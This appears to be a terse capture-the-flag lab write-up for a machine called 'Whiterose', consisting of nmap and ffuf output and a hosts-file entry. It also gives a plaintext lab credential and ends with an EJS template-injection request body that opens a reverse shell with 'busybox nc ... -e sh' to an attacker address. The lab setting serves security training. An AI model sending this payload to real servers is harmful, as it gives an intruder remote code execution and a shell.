# Whiterose

## Recon

```
$ nmap -sV -sC 10.66.128.105 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-14 05:17 -0500
Nmap scan report for cyprusbank.thm (10.66.128.105)
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.40 seconds
```

```
$ ffuf -u http://cyprusbank.thm -H "Host: FUZZ.cyprusbank.thm" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc all -fs 57

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cyprusbank.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.cyprusbank.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 57
________________________________________________

admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 131ms]
www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 129ms]
#www                    [Status: 400, Size: 182, Words: 7, Lines: 8, Duration: 126ms]
#mail                   [Status: 400, Size: 182, Words: 7, Lines: 8, Duration: 126ms]

```


```
10.66.128.105   cyprusbank.thm  admin.cyprusbank.thm
```


```
Gayle Bev: 'p~]P@5!6;rs558:q'
```

```
name=test&password=123&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 192.168.130.101 1337 -e sh');s
```